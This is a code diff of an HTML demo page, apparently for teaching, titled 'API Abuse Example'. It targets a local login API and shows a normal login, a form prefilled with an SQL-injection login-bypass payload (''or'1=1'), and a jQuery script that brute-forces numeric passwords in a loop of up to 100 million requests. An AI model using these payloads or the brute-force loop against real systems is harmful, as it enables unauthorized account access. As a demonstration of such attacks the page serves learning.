@@ -5,25 +5,102 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Login</title>
 
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
   </head>
   <body>
-    <p>FOR SQL Injection :: <b>' or '1=1</b></p>
-    <form id="loginForm">
-      <label for="email">Email:</label><br />
-      <input type="email" id="email" name="email" value="yash@gmail.com" /><br />
-      <label for="password">Password :</label><br />
-      <input type="text" id="password" name="password" value="123456" /><br /><br />
-      <input type="submit" value="Submit" />
-    </form>
-    <span id="message"></span>
+    <div class="container-fluid p-5 bg-primary text-white text-center"><h1>API Abuse Example</h1></div>
+    <div class="container mt-5 border p-2">
+      <h1 class="ul">Simple Login API</h1>
+      <hr />
+      <div class="row">
+        <div class="col-sm-6">
+          <form id="loginFormOne">
+            <div class="mb-3 row">
+              <label for="staticEmail" class="col-sm-2 col-form-label">Email</label>
+              <div class="col-sm-10">
+                <input type="text" class="form-control" id="emailOne" name="email" value="yash@gmail.com" />
+              </div>
+            </div>
+            <div class="mb-3 row">
+              <label for="inputPassword" class="col-sm-2 col-form-label">Password</label>
+              <div class="col-sm-10">
+                <input type="text" class="form-control" id="passwordOne" name="password" value="123456" />
+              </div>
+            </div>
+            <div class="col-auto"><input type="submit" class="btn btn-primary mb-3" value="Submit" /></div>
+          </form>
+        </div>
+        <div class="col-sm-6">
+          <h3>Output of API Call</h3>
+          <div class="border p-2"><pre id="messageOne"></pre></div>
+        </div>
+      </div>
+    </div>
+    <div class="container mt-5 border p-2">
+      <h1 class="ul">SQL Injection Login API</h1>
+      <hr />
+      <div class="row">
+        <div class="col-sm-6">
+          <form id="loginFormTwo">
+            <div class="mb-3 row">
+              <label for="staticEmail" class="col-sm-2 col-form-label">Email</label>
+              <div class="col-sm-10">
+                <input type="text" class="form-control" id="emailTwo" name="email" value="yash@gmail.com" />
+              </div>
+            </div>
+            <div class="mb-3 row">
+              <label for="inputPassword" class="col-sm-2 col-form-label">Password</label>
+              <div class="col-sm-10">
+                <input type="text" class="form-control" id="passwordTwo" name="password" value="'or'1=1" />
+              </div>
+            </div>
+            <div class="col-auto"><input type="submit" class="btn btn-primary mb-3" value="Submit" /></div>
+          </form>
+        </div>
+        <div class="col-sm-6">
+          <h3>Output of API Call</h3>
+          <div class="border p-2"><pre id="messageTwo"></pre></div>
+        </div>
+      </div>
+    </div>
+    <div class="container mt-5 border p-2">
+      <h1 class="ul">Brute Force Attack Login API</h1>
+      <hr />
+      <div class="row">
+        <div class="col-sm-6">
+          <form id="loginFormThree">
+            <div class="mb-3 row">
+              <label for="staticEmail" class="col-sm-2 col-form-label">Email</label>
+              <div class="col-sm-10">
+                <input type="text" class="form-control" id="emailThree" name="email" value="yash@gmail.com" />
+              </div>
+            </div>
+            <div class="mb-3 row">
+              <label for="inputPassword" class="col-sm-2 col-form-label">Password</label>
+              <div class="col-sm-10">
+                <input type="text" class="form-control" id="passwordThree" name="password" value="'or'1=1" />
+              </div>
+            </div>
+            <div class="col-auto"><input type="submit" class="btn btn-primary mb-3" value="Submit" /></div>
+            <p id="passwordCount"></p>
+          </form>
+        </div>
+        <div class="col-sm-6">
+          <h3>Output of API Call</h3>
+          <div class="border p-2"><pre id="messageThree"></pre></div>
+        </div>
+      </div>
+    </div>
   </body>
   <script>
     $(document).ready(function() {
-      $("#loginForm").on("submit", function(e) {
+      // Simple API call for Login
+      $("#loginFormOne").on("submit", function(e) {
         e.preventDefault();
-        var email = $("#email").val();
-        var password = $("#password").val();
+        var email = $("#emailOne").val();
+        var password = $("#passwordOne").val();
 
         $.ajax({
           url: "http://localhost:5000/api/users/login",
@@ -33,12 +110,60 @@
           },
           data: JSON.stringify({ email, password }),
           success: function(response, status) {
-            $("#message").text(response.message);
-          },
-          error: function(error) {
-            $("#message").text(error.responseJSON.message);
+            $("#messageOne").text(JSON.stringify(response, null, 3));
           }
         });
+      });
+
+      // SQL Injection API call for Login
+      $("#loginFormTwo").on("submit", function(e) {
+        e.preventDefault();
+        var email = $("#emailTwo").val();
+        var password = $("#passwordTwo").val();
+
+        $.ajax({
+          url: "http://localhost:5000/api/users/login",
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          data: JSON.stringify({ email, password }),
+          success: function(response, status) {
+            $("#messageTwo").text(JSON.stringify(response, null, 3));
+          }
+        });
+      });
+
+      // Brute Force attack API call for Login
+      $("#loginFormThree").on("submit", function(e) {
+        e.preventDefault();
+        var email = $("#emailThree").val();
+        var counter = 0;
+        var password = "";
+        for (var i = 0; i < 100000000; i++) {
+          var stop = false;
+          counter += 1;
+          password = i.toString().padStart(6, "1");
+          $.ajax({
+            url: "http://localhost:5000/api/users/login",
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            data: JSON.stringify({ email, password }),
+            success: function(response, status) {
+              console.log(response.status);
+              if (response.status == true || response.status == "true") {
+                stop = true;
+              }
+              $("#messageThree").text(JSON.stringify(response, null, 3));
+              $("#passwordThree").val(password);
+              $("#passwordCount").text(`Before correct password, total password used :: ${counter}`);
+            }
+          });
+
+          if (stop) break;
+        }
       });
     });
   </script>
